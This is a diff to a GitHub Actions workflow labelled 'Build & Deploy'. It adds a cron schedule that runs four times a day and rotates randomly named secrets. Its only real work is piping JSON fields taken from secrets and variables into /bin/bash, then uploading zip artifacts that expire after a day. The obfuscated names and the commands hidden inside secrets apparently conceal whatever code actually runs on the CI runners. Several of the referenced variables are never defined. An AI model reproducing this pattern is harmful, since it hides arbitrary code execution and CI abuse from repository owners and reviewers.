@@ -2,6 +2,8 @@ name: Build & Deploy
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '46 3,9,15,21 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -12,22 +14,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: Deploy
         env:
-          qghq4818: ${{ secrets.qghq4818 }}
+          gfb304: ${{ secrets.gfb304 }}
         run: |
-          printf '%s' "$qghq4818" | jq -r .v40 | /bin/bash
-          printf '%s' "$xy02313" | jq -r .f7 | /bin/bash
-          echo $fan4246 | jq -r .juw425 | /bin/bash
-          echo $etfo767 | jq -r .jxhs8 | /bin/bash
-          printf '%s' "$ls87" | jq -r .voig5 | /bin/bash
-          printf '%s' "$jqf9660" | jq -r .bqm8 | /bin/bash
-          echo $r342 | jq -r .hjuy79217 | /bin/bash
-          echo $dp034 | jq -r .jpdcy31 | /bin/bash
-          echo $a86 | jq -r .dkvlt4816 | /bin/bash
-          printf '%s' "$szd1888" | jq -r .bm36 | /bin/bash
+          printf '%s' "$gfb304" | jq -r .nvue9 | /bin/bash
+          echo $x595 | jq -r .ss9 | /bin/bash
+          echo $wzji3599 | jq -r .rp0598 | /bin/bash
+          echo $uewdc90 | jq -r .oghxw766 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
         with:
-          name: ctQkZC7r
+          name: LVNbg84A
           path: "*.zip"
           retention-days: 1
